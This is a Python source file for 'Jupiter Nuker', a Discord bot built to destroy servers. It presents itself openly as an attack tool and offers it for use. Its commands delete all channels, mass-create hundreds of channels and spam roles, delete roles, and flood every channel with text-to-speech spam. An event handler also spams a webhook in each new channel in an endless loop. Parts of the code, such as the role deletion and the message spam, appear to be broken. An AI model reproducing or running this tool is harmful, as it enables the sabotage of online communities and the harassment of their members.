#made by axel/core

import discord
from discord.ext import commands
import json
import aiohttp
import requests
import colorama
from colorama import Fore as F
import json
import os
import time
import random
import base64
import string
import threading
from threading import Thread
from pystyle import Center
import asyncio

with open("config.json", "r") as config:
    data = json.load(config)
    token = data["Token"]
    prefix = data["Prefix"]
    chans = data["CHANNEL_NAME"]
    rol = data["ROLE_NAME"]
    hookmsg = data["WEBHOOK_MSG"]
    hookname = data["WEBHOOK_NAME"]

BASE_URL = "https://discord.com/api/v9"
intents = discord.Intents.all()
intents.members = True
header = {
    'Authorization': f'Bot {token}'
}
bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None)
good_codes = [200, 201, 204]
colorama.init(autoreset=True)
stat = "Jupiter on TOP"

@bot.event
async def on_guild_channel_create(chans):
    webhook = await chans.create_webhook(name=hookname)
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
        while True:
            await webhook.send(hookmsg)
            await chans.send(hookmsg)

@bot.event
async def on_ready():
    os.system(f"title [ Jupiter Nuker ] [ {bot.user.name}#{bot.user.discriminator} ] [ {prefix} ] ")
    print(Center.Center(f"""{F.RED}
     ▄█ ███    █▄     ▄███████▄  ▄█      ███        ▄████████    ▄████████ 
    ███ ███    ███   ███    ███ ███  ▀█████████▄   ███    ███   ███    ███ 
    ███ ███    ███   ███    ███ ███▌    ▀███▀▀██   ███    █▀    ███    ███ 
    ███ ███    ███   ███    ███ ███▌     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
    ███ ███    ███ ▀█████████▀  ███▌     ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
    ███ ███    ███   ███        ███      ███       ███    █▄  ▀███████████ 
    ███ ███    ███   ███        ███      ███       ███    ███   ███    ███ 
█▄ ▄███ ████████▀   ▄████▀      █▀      ▄████▀     ██████████   ███    ███ 
▀▀▀▀▀▀                                                          ███    ███ 
"""))
    print(f"""{F.RED}
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
    {F.RED}[+]{F.RESET} Logged in as {F.RED}{bot.user.name}#{bot.user.discriminator}{F.RESET}              {F.RED}[+]{F.RESET} Prefix {F.RED}{prefix}{F.RESET}                {F.RED}[+]{F.RESET} Servers {F.RED}{len(bot.guilds)}{F.RESET}{F.RED}              
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
""")
    game = discord.Game(stat)
    await bot.change_presence(status=discord.Status.online, activity=game)

@bot.command()
async def help(ctx):
    await ctx.message.delete()
    help = discord.Embed(title="[ ✚ ] ══════╣ 𝐉𝐮𝐩𝐢𝐭𝐞𝐫 𝐍𝐮𝐤𝐞𝐫 ╠══════ [ ✚ ]")
    help.add_field(name=f"{prefix}help", value="shows this")
    help.add_field(name=f"{prefix}nuke", value="nuke the server")
    help.add_field(name=f"{prefix}ccr", value="create 500 channels")
    help.add_field(name=f"{prefix}cdel", value="deletes all channels")
    help.add_field(name=f"{prefix}spam", value="spams all the channels")
    help.add_field(name=f"{prefix}rcr", value="creates roles")
    help.add_field(name=f"{prefix}rdel", value="deletes all roles")
    help.set_image(url="https://media.discordapp.net/attachments/1060277827032862790/1077550499928215642/High_resolution_globe_of_Jupiter.jpg")
    await ctx.send(embed=help)

@bot.command()
async def nuke(ctx):
    guild = ctx.guild.id
    await channel_deleter(ctx)
    await ccr(ctx)


@bot.command() 
async def ccr(ctx):
      await ctx.message.delete()
      guild=ctx.guild.id


      def channelspam(id):
        json = {'name': chans}
        headers = {'Authorization': f'Bot {token}'}
        requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=json)
      print(f"{F.RED} [+] Spamming Channels")
      try:
        for i in range(500):
          Thread(target=channelspam, args=(ctx.guild.id,)).start()
      except:
        print(f"{F.RED} [+] Failed")


async def delchan(session: aiohttp.ClientSession, id):
	while True:
		async with session.delete(f"{BASE_URL}/channels/{id}", headers=header) as resp:
			if resp.status == 200:

				break
			elif resp.status == 429:
				j = await resp.json()
				await asyncio.sleep(j['retry_after'])
			else:
				j = await resp.json()
				break


async def channel_deleter(ctx):
	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=json.dumps, auto_decompress=True) as session:
		await asyncio.gather(*(asyncio.create_task(delchan(session, channel.id)) for channel in ctx.guild.channels))


@bot.command()
async def cdel(ctx):
	await ctx.message.delete()
	await channel_deleter(ctx)

@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    guild=ctx.guild.id

    def spam(id):
        json = {'content': hookmsg, 'tts': True}
        headers = {'Authorization': f'Bot {token}'}
        requests.post(f'https://discord.com/api/v9/channels/{guild}/messages', headers=headers, json=json)
    try:
        while True:
            for channnel in list(ctx.guild.channels):
                Thread(target=spam, args=(channnel.id,)).start()
    except:
        print("Failed to spam")

@bot.command() 
async def rcr(ctx):
      await ctx.message.delete()
      guild=ctx.guild.id


      def rolespam(id):
        json = {'name': rol}
        headers = {'Authorization': f'Bot {token}'}
        requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headers, json=json)
      print(f"{F.RED} [+] Spamming Roles")
      try:
        for i in range(50):
          Thread(target=rolespam, args=(ctx.guild.id,)).start()
      except:
        print(f"{F.RED} [+] Failed")

@bot.command() 
async def rdel(ctx):
      await ctx.message.delete()
      guild=ctx.guild.id


      def roledelete(id):
        headers = {'Authorization': f'Bot {token}'}
        requests.delete(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headers)
      print(f"{F.RED} [+] Deleting Roles")
      try:
        for i in range(50):
          Thread(target=roledelete, args=(ctx.guild.id,)).start()
      except:
        print(f"{F.RED} [+] Failed")



bot.run(token)
